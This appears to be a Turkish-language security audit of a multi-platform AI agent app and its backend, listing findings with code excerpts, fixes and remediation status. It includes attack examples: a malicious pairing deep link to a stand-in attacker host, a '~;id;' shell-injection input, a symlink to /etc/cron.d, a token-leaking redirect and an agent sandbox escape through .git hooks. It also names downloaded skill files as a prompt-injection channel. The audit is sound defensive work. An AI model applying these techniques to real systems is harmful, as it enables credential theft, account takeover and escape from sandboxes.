# Güvenlik Denetimi — 2026-10-20

Kapsam: macOS (Swift), Windows (C#), Linux (C#), iOS (Swift), Android (Kotlin), Cloudflare Workers (TypeScript).
Yöntem: Statik kod okuma + doğrulama. Düzeltmeler bu dokümanın sonundaki "Düzeltme durumu" bölümünde.

Bulgu sayıları: macOS 24 · Windows+Linux 30 · iOS 15 · Android 16 · Backend 32 → **~117 bulgu**

## Özet tablo

| Platform | Kritik | Yüksek | Orta | Düşük |
|---|---|---|---|---|
| macOS | 2 | 7 | 9 | 6 |
| Windows + Linux | 4 | 9 | 12 | 5 |
| iOS | 1 | 2 | 6 | 6 |
| Android | 1 | 3 | 7 | 5 |
| Backend | 0 | 8 | 13 | 9 |

---

## KRİTİK

### C-1 · Deep link ile onaysız pairing — iOS + Android
`mobile/ios/Sources/RemoteControlClient.swift:272-280` · `mobile/android/app/src/main/java/com/dots/herness/mobile/RemoteClient.kt:209-215` · `mobile/android/app/src/main/AndroidManifest.xml:30-35`

```swift
// iOS
func consumePairURL(_ url: URL) {
    ...
    pairingEndpoint = payload.endpoint
    pairingCode = payload.code
    Task { await pair(payload) }        // ← kullanıcı onayı yok
}
```
```kotlin
// Android
fun consumePairUri(uri: Uri) {
    ...
    pairingEndpoint = payload.endpoint
    pairingCode = payload.code
    pair()                               // ← kullanıcı onayı yok
}
```

Android manifest'inde `CATEGORY_BROWSABLE` + `android:scheme="herness"` tanımlı. Bu, **herhangi bir web sayfasının**
`herness://pair?endpoint=https://saldirgan.example&code=123456` linkini telefonda otomatik başlatmasına izin verir.
Kullanıcı onayı yok; `pair()` otomatik çalışır. Saldırganın sunucusu `{token}` döner → token cihaza yazılır →
**tüm workspace aynası, prompt'lar, dosya içerikleri ve tool sonuçları saldırganın sunucusuna akar.**
Ayrıca saldırgan "desktop" rolünü oynayıp telefona `run_command` / `computer_use` komutları yönlendirebilir.

Ek risk: `herness://` scheme'ini başka bir uygulama kaydedebilir (scheme hijacking) — Apple/Android bunu zorlamaz.

**Düzeltme:** `consumePairURL`/`consumePairUri` yalnızca formu doldursun, `pair()` kullanıcının "Bağlan" butonuna bağlansın.
Daha güçlü: `herness://pair` scheme'ini kaldır → App Links (`https://dots.net.tr/pair` + `assetlinks.json`) veya QR.

### C-2 · Uzak kontrol ağ geçidi tüm arayüzlere dinliyor, düz HTTP, uygulama açılışında otomatik başlıyor — macOS + Windows + Linux
`macos/.../RemoteControl.swift:531` + `:475` · `shared/RemoteControl.cs:1564` · `macos/.../AppModel+Lifecycle.swift:62-63, 109-110`

```swift
let listener = try NWListener(using: NWParameters.tcp, on: port)   // 0.0.0.0
public var preferredEndpoint: String { "http://\(Self.preferredHost()):\(Self.port)" }
```
```csharp
_listener = new TcpListener(IPAddress.Any, port);   // 0.0.0.0
```
```swift
// AppModel+Lifecycle.swift — uygulama açılışı, kullanıcı onayı yok
self.remoteControl.start()
self.restoreRemoteCloudTunnel()
```

Token `Authorization: Bearer` ile **düz HTTP** üzerinden taşınıyor (TLS/sertifika yok). Aynı Wi-Fi'da token yakalanırsa
saldırgan **workspace okuma + dosya yazma + komut çalıştırma** elde eder. `GET /v1/control/file` ve
`/v1/control/transcript` onay gerektirmiyor. `restoreRemoteCloudTunnel` ile port ayrıca `trycloudflare.com`
üzerinden **internete** açılabiliyor.

**Düzeltme:** Varsayılan `127.0.0.1` (loopback) bağla; LAN erişimi ayrı, kullanıcı-seçmeli ayar olsun.
Otomatik başlatmayı kaldır. TLS zorunlu kıl. `authorize` karşılaştırmasını sabit-zamanlı yap.

### C-3 · Sandbox kaçışı: origin deposunun `.git` dizini yazılabilir → sandbox dışında kod çalıştırma — Windows + Linux
`shared/SandboxWorkspaces.cs:241-256` · `shared/AgentCommandSandbox.cs:126` · `windows/.../WindowsAgentCommandIsolation.cs:313`

```csharp
public static IReadOnlyList<string> AgentWritableRoots(SandboxWorkspace sandbox)
{
    foreach (var directory in new[] { sandbox.OriginPath, sandbox.Path })
        foreach (var flag in new[] { "--git-dir", "--git-common-dir" })
            roots.Add(Path.GetFullPath(...));   // → <origin>/.git
}
```

Sandbox içindeki ajan `<origin>/.git/hooks/post-checkout`, `<origin>/.git/config` (`core.hooksPath`, `core.pager`,
`core.sshCommand`) dosyalarına yazabilir. Kullanıcı daha sonra origin'de `git checkout` / `commit` / `diff` çalıştırdığında
saldırganın kodu **sandbox dışında, tam kullanıcı yetkisiyle** çalışır. Windows'ta ek olarak `WRITE_DAC` verildiği için
DACL değiştirilebilir.

**Düzeltme:** Yazılabilir kök olarak `<origin>/.git` yerine yalnızca worktree metadata'sı (`git rev-parse --git-path index`).
Nesne/ref yazımı `GIT_OBJECT_DIRECTORY` ile geçici dizine. `hooks/` ve `config` yazımını açıkça reddet.

### C-4 · Linux: `secret-tool` PATH hijacking ile tüm provider anahtarları sızdırılıyor
`linux/DotsHarness/src/DotsHarnessCore/PlatformProviderSecrets.cs:111-137`

```csharp
private static Process Start(params string[] args)
{
    var info = new ProcessStartInfo("secret-tool") { UseShellExecute = false, ... };
```
```csharp
private static bool CommandExists(string command)
{
    foreach (var directory in (Environment.GetEnvironmentVariable("PATH") ?? "").Split(':'))
        ... if (File.Exists(path) && executable) return true;
}
```

`secret-tool` PATH üzerinden `execvp` ile çözülüyor. PATH'te yazılabilir bir dizin varsayım yolu (proje kökü, `~/bin`,
pip/npm global bin) saldırganın `secret-tool` ikilisi yerleştirmesine yeter. İkili `store` çağrısında **düz metin API
anahtarını stdin'den** alır. `Lazy` ile process başında bir kez çözülür → bir kez ele geçirilse tüm oturum boyunca
tüm provider anahtarları, refresh token'ları ve `share.key` alınır.

**Düzeltme:** Mutlak sabit yol kullan (`/usr/bin/secret-tool`), PATH taramasını kaldır, sahiplik/izin doğrula.
Alternatif: libsecret API'sine doğrudan bağlan.

---

## YÜKSEK

### Y-1 · Keychain'de hiçbir yerde `kSecAttrAccessible` yok — macOS + iOS
`macos/.../ProviderStore.swift:213,231,249` · `macos/.../MCPClient.swift:632` · `macos/.../MarketplaceSession.swift:256`
· `macos/.../RemoteControl.swift:352` · `macos/.../SSHHostStore.swift:138` · `mobile/ios/Sources/RemoteControlClient.swift:500-504`

Repo genelinde `kSecAttrAccessible` **0 eşleşme**. Kapsadığı veriler: provider API anahtarları, OAuth refresh token'ları,
MCP bearer token'ları, Marketplace token'ları, cihaz pairing token'ları, SSH parolaları.
Sonuç: öğeler cihaza bağlı değil → **şifreli Time Machine/iCloud yedekleriyle başka cihaza taşınabilir**.

**Düzeltme:** Tüm `SecItemAdd` çağrılarına `item[kSecAttrAccessible as String] = kSecAttrAccessibleWhenUnlockedThisDeviceOnly`
ekle (refresh token için `AfterFirstUnlockThisDeviceOnly`).

### Y-2 · `PATCH /api/rest/users` ile `password_hash` yazılabiliyor — Backend
`cloudflare/src/routes/api/rest.ts:26` (tanım) + `:781-790` (PATCH handler)

```ts
users: { hiddenCols: ["password_hash"], immutable: ["id","email","role",...] },
```
PATCH handler'ında `hiddenCols` kontrolü **yok** (sadece `assertNoImmutableCols` var), `password_hash` `immutable` listesinde de yok → geçiyor.
Aynı şekilde `user_connections.key_value` (`rest.ts:33`) → at-rest AES-GCM şifreleme bypass'ı (`lib/user_key_crypto.ts:112` şifresiz değeri aynen döndürüyor).

Etki: `current_password` doğrulaması atlanıyor. Çalınan bir session token geçici erişimi **kalıcı hesap ele geçirmeye** dönüştürür.

**Düzeltme:** `password_hash`'i `immutable`'a ekle; PATCH/DELETE yollarına `hiddenCols` kontrolü ekle;
`user_connections` yazımını `routes/api/provider.ts` içindeki şifreleme akışına yönlendir.

### Y-3 · Rate limit IP'si `X-Forwarded-For`'a düşüyor → brute force koruması atlanıyor — Backend
`cloudflare/src/middleware/rate-limit.ts:19-28`
```ts
header("CF-Connecting-IP")?.trim() || header("X-Forwarded-For")?.split(",")[0]?.trim() || "unknown"
```
`CF-Connecting-IP` yoksa istemci `X-Forwarded-For` başlığını değiştirerek rate-limit anahtarını değiştirir.
Etkilenen: `/login` (10/dk), `/register` (5/saat), `/forgot-password` (5/saat), `/reset-password` (10/saat).
Aynı desen `lib/paytr.ts:326` içinde de var (HMAC girdisi).

**Düzeltme:** Production'da `CF-Connecting-IP` zorunlu; XFF fallback'i yalnızca yerel geliştirmede.

### Y-4 · `web_fetch` SSRF: DNS rebinding (TOCTOU) — Windows + Linux + iOS + Android
`shared/NativeWebTools.cs:521` (kontrol) vs `:540` (çözümleme) → bağlantı ayrı çözümleme ile kuruluyor.
`mobile/ios/Sources/WebTools.swift:416-444` · `mobile/android/.../WebTools.kt:190` vs `:447`

İlk çözümlemede public IP, bağlantı çözümlemesinde `127.0.0.1` / `169.254.169.254` dönen DNS sunucusu kontrolü atlar.
Sonuç: model yerel servislere ve cloud metadata endpoint'ine erişir; cevap modele döner.

**Düzeltme:** Çözümleme ve bağlantıyı aynı adrese bağla (`SocketsHttpHandler.ConnectCallback` / `NWConnection` + SNI koruması).
Redirect hop'unda da aynı pinning mantığı.

### Y-5 · Kırık (broken) symlink ile workspace dışına yazma — Windows + Linux
`shared/NativeWorkspaceTools.cs:588` · `shared/NativeFileEdit.cs:169-178, 298-310`

```csharp
var link = Directory.Exists(result) ? new DirectoryInfo(result).ResolveLinkTarget(true) : ...;
// ResolveLinkTarget, hedefi VAR OLMAYAN symlink'te null döner → çözülmez
```
`remove_file` symlink kontrolü yapıyor, **`write_file` / `edit_file` yapmıyor**. `evil -> /etc/cron.d/x` (hedefi henüz yok)
gibi bir kırık symlink oluşturulduğunda `RealPath` onu çözmez, prefix kontrolü "içeride" der ve dosya **workspace dışına** yazılır.

**Düzeltme:** `RealPath` içinde null dönünce ham `LinkTarget` ile mutlak yol hesapla; `WriteFile`/`WriteAtomically`'e
`HasSymlinkComponent` kontrolü ekle; son bileşende `ReparsePoint` reddet.

### Y-6 · Windows AppContainer ACL'i kalıcı, geri alınmıyor, `WRITE_DAC` içeriyor — Windows
`windows/.../WindowsAgentCommandIsolation.cs:27, 310-313`
```csharp
private const uint FileAllAccess = 0x001F01FF;   // FILE_ALL_ACCESS|DELETE|WRITE_DAC|WRITE_OWNER
GrantOnce(path, FileAllAccess, inherit: true, sid);
```
(a) Sandbox SID'i oturum sonrasında da workspace'e ve `<origin>/.git`'e tam yetkiyle erişiyor (ACE geri alınmıyor).
(b) `WRITE_DAC` → sandbox içindeki komut kendi DACL'ini değiştirebilir. (c) `inherit: true` → sonradan eklenen dosyalara da uygulanır.

**Düzeltme:** Oturum sonunda `SetNamedSecurityInfoW` ile ACE'leri geri al; dar maske kullan; `WRITE_DAC`/`WRITE_OWNER` verme.

### Y-7 · `usesCleartextTraffic="true"` — tüm Android trafiği düz HTTP'ye açık — Android
`mobile/android/app/src/main/AndroidManifest.xml:9`
```xml
android:usesCleartextTraffic="true">
```
`Authorization: Bearer <pairing token>` ve OAuth token'ları düz HTTP'de yakalanabilir. `RemoteEndpoint.isPrivateHost`
(`RemoteClient.kt:57-62`) zaten düz HTTP'ye izin veriyor — bu yüzden manifest bayrağı **gereksiz**.

**Düzeltme:** `android:usesCleartextTraffic="false"` + `res/xml/network_security_config.xml` ile daraltılmış domain istisnası.

### Y-8 · SSH `~` yolunda shell injection (quoteleme kırığı) — macOS
`macos/DotsHarness/Sources/DotsHarnessCore/SSHRunner.swift:185-192`
```swift
let expanded = path.hasPrefix("~")
    ? "cd \(path.replacingOccurrences(of: "'", with: "")) >/dev/null 2>&1 && pwd -P"  // ← QUOTELENMEDİ
    : probe
```
`~` ile başlayan yolda tırnaklama yerine tırnaklar **siliniyor**. `~;id;` girdisi uzak makinede `id` çalıştırır.
Dosyanın geri kalanı `shellQuote` (`:73-75`) doğru kullanıyor — tek istisna burası.

**Düzeltme:** `let expanded = path.hasPrefix("~") ? "cd -- \(shellQuote(path)) >/dev/null 2>&1 && pwd -P" : probe`

### Y-9 · Güncelleme paketi imzasız + indirme URL'si şema denetimsiz — macOS
`macos/.../UpdateChecker.swift:159-174`
```swift
targetURL = URL(string: info.downloadURL)   // ← sunucudan gelen string, şema kontrolü yok
NSWorkspace.shared.open(url)                // ← file:// / x-apple-... çalıştırılabilir
```
İndirilen `.dmg`/`.app` üzerinde imza doğrulaması (Ed25519 / `codesign --verify` / `spctl`) yok.

**Düzeltme:** Şemayı `https` ile sınırla (+ izinli host listesi); `sha256` + `signature` alanları ekle;
kurulumda `codesign --verify --deep --strict` + `spctl --assess` çalıştır.

### Y-10 · `superadmin` REST bypass'i `email` değiştirebiliyor → hesap ele geçirme — Backend
`cloudflare/src/routes/api/rest.ts:221-232`
```ts
if (adminUserBypass && key !== "id" && key !== "created_at" && key !== "status") continue;
```
`email` `immutable` listesinde ama admin bypass'ı onu atlatıyor → superadmin kurbanın email'ini kendi email'i yapıp
`forgot-password` ile parola sıfırlayabilir. `email_verified`, `auth_provider`, `provider_id` de korunmuyor.

**Düzeltme:** `email` değişikliğini bypass'tan muaf tut; yalnızca `/api/user/change-email` akışından yapılabilsin.

### Y-11 · Kimlik doğrulama kanalında redirect izlemesi kapatılmamış — Android + iOS
`mobile/android/.../RemoteClient.kt:431-439` · `mobile/ios/Sources/RemoteControlClient.swift:223,440`
```kotlin
check(RemoteEndpoint.isAllowed(parsed)) { ... }   // ← yalnızca ilk URL kontrol edilir
...                                               // instanceFollowRedirects varsayılan TRUE
```
`WebTools.kt:194` bilinçli olarak `instanceFollowRedirects = false` kullanıyor — **iki farklı politika**.
Saldırgan `302 Location: http://saldirgan.example/` diyerek Bearer token'ı düz HTTP'ye yönlendirebilir.

**Düzeltme:** `instanceFollowRedirects = false`; 3xx'te `Location` yeniden doğrula, `Authorization` başlığını düşür.

### Y-12 · Plugin/Skill bütünlük doğrulaması opsiyonel — macOS + Windows + Linux
`macos/.../PluginInstaller.swift:50-56, 88` · `macos/.../SkillCatalog.swift:334-337` · `windows/.../PluginCatalog.cs:135`
İmza verilmezse doğrulama **tamamen atlanır**; `sha256` yoksa bütünlük kontrolü yok.
`SKILL.md` → sistem prompt'a giden markdown → indirilen içerik **prompt injection** kanalıdır.

**Düzeltme:** `sha256` veya `signature`'dan birini zorunlu kıl; registry çıktısını imzala; skill içeriğini
`trust: .untrusted` seviyesine taşı.

### Y-13 · Marketplace `permissions`/`riskLevel` yalnızca UI'da gösteriliyor — macOS + Windows + Linux
`macos/.../Marketplace.swift:85,122` · `macos/.../PluginHost.swift:237-269`
Yerel bir JSON bayrağı (`trust.json`) "güven" kararını belirliyor; native plugin `dlopen`/`NativeLibrary.TryLoad`
ile **süreç içinde tam yetkiyle** çalışıyor. `WRITE_DAC`, keychain, ağ, ekran kaydı — hepsi erişilebilir.

**Düzeltme:** Plugin'leri ayrı düşük yetkili süreçte çalıştır (out-of-process host) veya beyan edilen yetkileri
gerçekten kısıtla.

---

## ORTA (seçilmiş)

| # | Platform | Bulgu | Konum |
|---|---|---|---|
| O-1 | macOS | Sandbox deny-listesi eksik (`~/.git-credentials`, `~/.docker`, `~/.kube`, `~/.gnupg`, `~/.cargo/credentials`, shell history) | `SandboxProfile.swift:242-284` |
| O-2 | macOS | Web arama API anahtarı `UserDefaults`'ta düz metin (0644 plist) | `WebTools.swift:276-281` |
| O-3 | macOS | MCP HTTP transport şema/host doğrulaması yok → bearer token düz HTTP'de | `MCPClient.swift:460-470` |
| O-4 | macOS | `NSWorkspace.open` şema denetimi yok (`file://`, `x-...`) | `UpdateChecker.swift:172`, `ConversationView.swift:1208,1676,1906` |
| O-5 | macOS | `NativeBrowserService` loopback + `about:` serbest → SSRF | `NativeBrowserService.swift:127-150` |
| O-6 | macOS | Hardened runtime ve entitlements yok; uygulama sandbox'sız çalışıyor | `scripts/package-dmg.sh:331-337` |
| O-7 | macOS | `MCPServerConfig.environment` düz metin `mcp-servers.json` (0644) | `MCPRegistry.swift:439-448` |
| O-8 | Windows | Bubblewrap `--ro-bind / /` tüm root FS'i sandbox'a alıyor | `shared/AgentCommandSandbox.cs:53-55` |
| O-9 | Windows | `cmd.exe` komut satırı tırnaklama hatası (`CreateProcessW` ayrıştırması) | `WindowsAgentCommandIsolation.cs:183-188` |
| O-10 | Windows | `RouterController` uzak URL'yi doğrulamadan `ShellExecute`'e veriyor | `RouterController.cs:306-307` |
| O-11 | Windows/Linux | `NativeProviderRouter` migration hatası yutuyor → düz metin sır kalıcı; dosya 0644 | `NativeProviderRouter.cs:374-405,184` |
| O-12 | Windows/Linux | Workspace kimlik private key'i düz metin; Windows'ta DPAPI yok, Linux'ta mod yeniden uygulanmıyor | `WorkspaceAccessStore.cs:48-56,721-726` |
| O-13 | Windows/Linux | `mcp-servers.json` `Environment` değerleri düz metin, 0644 | `shared/McpRegistry.cs:97-117,318-327` |
| O-14 | Windows/Linux | `settings.json` tüm ayar anlık görüntüsünü düz metin yazıyor | `windows/.../AppModel.cs:1871-1877` |
| O-15 | Windows/Linux | `grep_files` ReDoS — timeout satır başına, toplam süre sınırsız | `NativeWorkspaceTools.cs:283-328` |
| O-16 | Windows/Linux | `FileDownloader` checksum doğrulanmadan hedefe taşınıyor; sha256 yoksa boyutun yarısı yeterli | `windows/.../FileDownloader.cs:66,85` |
| O-17 | Windows/Linux | Yerel `llama-server` API anahtarı olmadan 127.0.0.1'de açık | `shared/LocalRuntime.cs:189` |
| O-18 | Windows/Linux | CDP portu kimlik doğrulamasız; `ReservePort` TOCTOU | `shared/BrowserSessionManager.cs:489-535` |
| O-19 | Windows/Linux | `RemoteSsh` `.mem` koruması regex tabanlı, kolay atlanıyor | `shared/RemoteSsh.cs:263-271` |
| O-20 | iOS | `NSAllowsLocalNetworking` → yerel HTTP'ye izin | `mobile/ios/Info.plist:40-44` |
| O-21 | iOS | Clipboard'a düz metin kod kopyalama (Universal Clipboard sızıntısı) | `mobile/ios/Sources/MarkdownBody.swift:93` |
| O-22 | iOS | `JSContext` plugin motorunda yürütme limiti yok → ana thread donması | `mobile/ios/Sources/MobilePlugins.swift:84-117` |
| O-23 | iOS | `LocalShell` regex'i modelden → ReDoS | `mobile/ios/Sources/LocalShell.swift:227,267` |
| O-24 | iOS | `SandboxWorkspace.exit(merge:)` `originPath` UserDefaults'tan → origin altında silme | `mobile/ios/Sources/LocalWorkspaceStore.swift:35-45` |
| O-25 | Android | WebView: `javaScriptEnabled=true`, `allowContentAccess` varsayılan true, `http://` kabul | `MainActivity.kt:2529-2538` |
| O-26 | Android | Keystore anahtarı `setUserAuthenticationRequired` yok → kilit açıkken okunabilir | `RemoteClient.kt:519-530` |
| O-27 | Android | Sertifika sabitleme / network security config yok | `RemoteClient.kt:435`, `McpClient.kt:75` |
| O-28 | Android | Rhino plugin motorunda instruction limit yok → uygulama kilitlenmesi | `Plugins.kt:56-101` |
| O-29 | Android | `LocalShell.grep` model girdisinden regex → ReDoS | `LocalShell.kt:141` |
| O-30 | Android | Uzak sunucu `preview_tunnel` ile telefonda keyfi URL yükleyebiliyor (phishing) | `MainActivity.kt:2508-2520` |
| O-31 | Backend | `securityGuardMiddleware` koruma kapsamı çok dar; `/aitrack/*` hiç korumasız | `middleware/security-guard.ts:27-33` |
| O-32 | Backend | Hesap silme yeniden kimlik doğrulama istemiyor | `routes/api/user.ts:1475` |
| O-33 | Backend | Refresh token rotation + reuse detection yok; 30 gün yeniden kullanılabiliyor | `routes/api/auth.ts:440-485` |
| O-34 | Backend | CORS `Vary: Origin` yalnızca izinli origin'de → cache poisoning | `middleware/cors.ts:26-49` |

---

## DÜŞÜK (seçilmiş)

- **macOS** — Pairing token karşılaştırması sabit-zamanlı değil (`RemoteControl.swift:426-430`)
- **macOS** — `MiniYAML` özyineleme derinliği sınırı yok → stack overflow (`MiniYAML.swift:72-152`)
- **macOS** — Sandbox alt sürece uygulamanın gerçek env'ini miras bırakıyor (`WorkspaceTools.swift:639`)
- **Windows/Linux** — DPAPI entropy yok, `CRYPTPROTECT_UI_FORBIDDEN` yok, `Blob` girdi işaretçisi sızdırılıyor (`PlatformProviderSecrets.cs:25-47`)
- **Windows/Linux** — `share.key` karşılaştırması sabit-zamanlı değil (`RouterController.cs:1233-1236`)
- **Windows/Linux** — Paketleme scriptleri checksum/imza üretmiyor (`windows/scripts/package-zip.ps1`)
- **iOS** — `herness://` scheme hijacking'e açık; OAuth `state`+PKCE var (iyi) ama pairing akışında `state` yok
- **iOS** — Biyometrik/cihaz-kilitli erişim kapısı yok (`LocalAuthentication` kullanılmıyor)
- **Android** — `herness-release.jks` + `keystore.properties` düz metin diskte (depoya **sızmamış**, `.gitignore` doğru)
- **Android** — Release derleme keystore yoksa **imzasız** APK üretebiliyor (`build.gradle.kts:5-9`)
- **Backend** — `BLOCKED_QUERY_PATTERNS` WAF benzeri filtre güvenlik teorisidir (SQL zaten parametrik)
- **Backend** — `wrangler.jsonc` `workers_dev: true` → ikinci açık origin

---

## DOĞRULANMASI GEREKEN NOKTALAR

1. **Y-11** — JDK `HttpURLConnection` ve iOS `URLSession`'ın cross-host redirect'te `Authorization` başlığını koruyup korumadığı.
2. **C-1** — Gerçek cihazda `herness://` scheme'inin ikinci uygulama tarafından kaydedilip pairing URL'ini yakalaması.
3. **A-4 (Android)** — `herness-release.jks` / `keystore.properties` CI loglarına veya build artifact'larına sızıyor mu.
4. **Y-3 (Backend)** — Production'da `CF-Connecting-IP` istemci tarafından ezilebiliyor mu (Cloudflare dışı origin senaryosu).
5. **Y-6** — `securityGuardMiddleware` mount'unun `apiApp` içinde yol önekini doğru kaldırdığı (Hono `route()` path rewrite davranışı).
6. **Backend** — `users.role` CHECK constraint (`user`,`superadmin`,`admin`) vs `ALLOWED_USER_ROLES` (`moderator` dahil) uyuşmazlığı.
7. **`shared/NativeWebTools.cs`** — `ConnectCallback` ile IP pinning eklenebiliyor mu.

---

## DOĞRU YAPILANLAR (dokunmayın)

| Alan | Kanıt |
|---|---|
| Parola hashleme | `bcryptjs`, 10 tur (`lib/password.ts`) |
| Kullanıcı sayımı | `routes/api/auth.ts:278` — kullanıcı yoksa da sahte hash doğrular |
| JWT fail-closed | `lib/jwt.ts:8-17` — secret yoksa hata fırlatır, sabit fallback yok |
| SQL injection | Tüm sorgular `?` placeholder + `.bind()`; string birleştirme yalnızca allowlist |
| XSS (markdown) | `AttributedString(markdown:)` — HTML yorumlanmıyor, WebView yok |
| XXE | Hiçbir yerde XML parser kullanılmıyor |
| Plugin imzası (macOS) | `PluginPackage.verify` — ed25519 + sabitlenmiş publisher key + arşiv hash'i |
| İndirme bütünlüğü | `LocalRuntime` / `CloudTunnel` / `VoiceInput` → SHA-256 sabitli + HTTPS |
| macOS ATS | `NSAllowsArbitraryLoads` yok, `serverTrust` handler'ı yok |
| macOS log sızıntısı | `print(`/`os_log` ile credential basımı yok; `RemoteEventHub.sanitize` var |
| Android crypto | AES/GCM/NoPadding, IV yeniden kullanılmıyor, anahtar AndroidKeyStore'da |
| OAuth (mobil) | PKCE + `state` doğrulaması var |
| Linux sandbox | bubblewrap `--die-with-parent --unshare-net/ipc/uts/pid --cap-drop ALL --clearenv` |
| SSRF (macOS web tools) | `WebTools.requirePublicURL` her redirect hop'unda özel IP aralıklarını reddediyor |
| Marketplace (C#) | HTTPS + SHA-256 + Ed25519 + zip-slip koruması + manifest id/version doğrulaması |
| Zararlı yazılım taraması | `store-gate.yml` → Greenlight preflight CI'da çalışıyor |

---

# Düzeltme durumu (2026-10-20)

## Kritik — tamamlandı

| Bulgu | Düzeltme | Dosyalar |
|---|---|---|
| C-1 · Onaysız deep-link pairing (iOS+Android) | `herness://pair` artık eşleştirmeyi **otomatik başlatmıyor**; kullanıcı host'u ve kodu görüp onaylıyor. Onaylanmadan hiçbir istek gitmiyor. | `mobile/ios/Sources/RemoteControlClient.swift`, `mobile/ios/Sources/HerNessMobileApp.swift`, `mobile/android/.../RemoteClient.kt`, `mobile/android/.../MainActivity.kt` |
| C-2 · Ağ geçidi 0.0.0.0 + düz HTTP + otomatik açılış | Gateway **opt-in** (`remote.control.enabled`), varsayılan **loopback**; LAN paylaşımı ayrı bir opt-in. Açılışta otomatik başlamıyor, cloud tunnel de gateway kapalıyken geri gelmiyor. LAN adresi `.local` mDNS adı. | `macos/.../RemoteControl.swift`, `macos/.../AppModel.swift`, `macos/.../AppModel+Lifecycle.swift`, `macos/.../AppModel+Settings.swift`, `macos/.../SettingsSkills.swift`, `shared/RemoteControl.cs`, `windows/.../AppModel.cs`, `windows/.../SettingsView.xaml.cs`, `linux/.../SettingsWindow.axaml.cs` |
| C-3 · Sandbox kaçışı: `.git/hooks` + `.git/config` yazımı | Git metadata dizinleri **salt okunur**: macOS seatbelt `deny file-write*`, Linux bubblewrap `--ro-bind`, Windows **DENY ACE**. `git commit` çalışmaya devam eder (objects/refs yazılabilir). | `macos/.../SandboxProfile.swift`, `shared/GitMetadataGuards.cs` (yeni), `shared/AgentCommandSandbox.cs`, `windows/.../WindowsAgentCommandIsolation.cs` |
| C-4 · Linux `secret-tool` PATH hijacking | `secret-tool` artık PATH'ten değil **sabit mutlak yoldan** (`/usr/bin`, `/bin`) çözülüyor; ikili ve dizini başkası tarafından yazılabilir değilse reddediliyor. | `linux/.../PlatformProviderSecrets.cs` |

## Yüksek — tamamlandı

| Bulgu | Düzeltme |
|---|---|
| Y-1 · Keychain'de `kSecAttrAccessible` yok | Tüm `SecItemAdd`/`SecItemUpdate` çağrılarına `kSecAttrAccessibleWhenUnlockedThisDeviceOnly` (marketplace refresh token'ı `AfterFirstUnlockThisDeviceOnly`). Yeni anahtar: `macos/.../KeychainAccess.swift`. |
| Y-2 · `PATCH /api/rest/users` → `password_hash` yazılabiliyor | `password_hash` `immutable` listesine alındı; PATCH/DELETE artık `hiddenCols` kontrolü yapıyor → `key_value` şifreleme bypass'ı da kapandı. |
| Y-3 · Rate limit IP'si `X-Forwarded-For`'a düşüyor | Sadece `CF-Connecting-IP` güvenilir. XFF yalnızca `ALLOW_LOCAL_ORIGINS=1` (yerel geliştirme) iken. Ayrıca **hesap bazlı** ikinci limit: `/login` 10/5dk, `/forgot-password` 5/saat — IP'den bağımsız. |
| Y-5 · Kırık symlink ile workspace dışına yazma | `RealPath` kırık linkin **ham hedefini** çözüyor (prefix kontrolü yakalıyor) + `write_file` symlink bileşeni reddediyor (yalnızca root altındaki bileşenler, `/var` gibi kök symlink'leri hariç). |
| Y-6 · Windows AppContainer ACL'i kalıcı, `WRITE_DAC` içeriyor | Oturum sonunda **tüm eklenen ACE'ler geri alınıyor** (`Release()`), `WRITE_DAC`/`WRITE_OWNER` kaldırıldı, dar yetki maskesi kullanılıyor. `SetSandboxExecution([])` ile tetikleniyor. |
| Y-7 · Android `usesCleartextTraffic="true"` | `false` + `network_security_config.xml`: cleartext sadece `.local`/loopback için. Uygulama politikası da eşitlendi (raw LAN IP reddediliyor), masaüstü `.local` mDNS adını yayınlıyor. |
| Y-8 · SSH `~` yolunda shell injection | Tırnaklama düzeltildi; `~` genişletmesi kabuk tarafından `"$HOME"` ile yapılıyor, kalan yol tırnaklanıyor. |
| Y-9 · Güncelleme URL'si şema denetimsiz | `openDownloadPage` artık yalnızca **HTTPS + izinli yayın hostlarını** açıyor (`file://`, `x-apple-...` reddediliyor). |
| Y-10 · Superadmin `email` değiştirebiliyor | Admin bypass yalnızca `status` için geçerli; `email`/`email_verified`/`auth_provider`/`provider_id` değiştirilemez. |
| Y-11 · Kimlik doğrulama kanalında redirect izleniyordu | Android'de redirect'ler elle izleniyor, her hop yeniden doğrulanıyor, host değişince `Authorization` düşürülüyor. iOS'ta `URLSessionTaskDelegate` redirect'leri durdurup aynı kontrolü yapıyor. |
| Y-12 · Plugin/skill bütünlük doğrulaması opsiyonel | SKILL.md için checksum **zorunlu**; uzak plugin kurulumu checksum veya imza olmadan reddediliyor. Trust dosyaları 0600 / kullanıcı-ACL. |

## Orta — kısmen tamamlandı

- **O-1** macOS sandbox deny listesi: `.git-credentials`, `.docker`, `.kube`, `.gnupg`, `.cargo`, `.gem`, `.m2`, `.zsh_history`, `.bash_history`, `.local/share` eklendi.
- **O-2** Web arama API anahtarı artık Keychain'de (macOS + iOS), UserDefaults'a yazılan eski değer otomatik taşınıyor.
- **O-3** MCP HTTP taşıması artık HTTPS zorunlu (loopback dışında).
- **O-4** `NSWorkspace.open` → `SafeURL.openWeb` (ağ adresleri için http/https + credential yok); `SafeURL.openFile` kök kontrolü.
- **O-5** `NativeBrowserService` artık `WebTools.requirePublicURL` politikasını uyguluyor (loopback/özel IP reddi), `about:blank` dışındaki `about:` reddi.
- **O-11** Provider secret geçişi hatası artık sessizce yutulmuyor; dosya izinleri sertleştirildi.
- **O-12** Workspace kimlik private key'i: dosya **her açılışta** 0600'e çekiliyor (Windows'ta kullanıcı-ACL), yazma geçici dosyada 0600 ile yapılıyor.
- **O-16** `FileDownloader` checksum'u **hedefe taşımadan önce** doğruluyor; checksum yoksa boyut "yarısı yeter" yerine **tam eşitlik** arıyor.
- **O-31** Backend guard artık **tüm** API rotalarını kapsıyor (`app` zone, 120/dk); `/aitrack/*` de guard alıyor. `--` ve `/*` WAF desenleri kaldırıldı (meşru sorguları bozuyordu).
- **O-33** Refresh token **rotasyonlu**: her kullanımda yenilenir, tekrar kullanımı (grace penceresi dışında) hesabın tüm oturumlarını iptal eder. Migration: `0008_refresh_token_rotation.sql`.

## Kalan açık maddeler

| Bulgu | Durum |
|---|---|
| Y-4 · DNS rebinding SSRF (4 platform) | **Açık** — çözüm ve bağlantının aynı IP'ye bağlanması gerekiyor (`ConnectCallback` / `NWConnection` + SNI). |
| Y-13 · Marketplace `permissions`/`riskLevel` yalnızca UI'da | **Açık** — yetki beyanı ABI'ye taşınıp gerçekten uygulanmalı. |
| O-6 | macOS hardened runtime / entitlements — **açık** (paketleme betiği). |
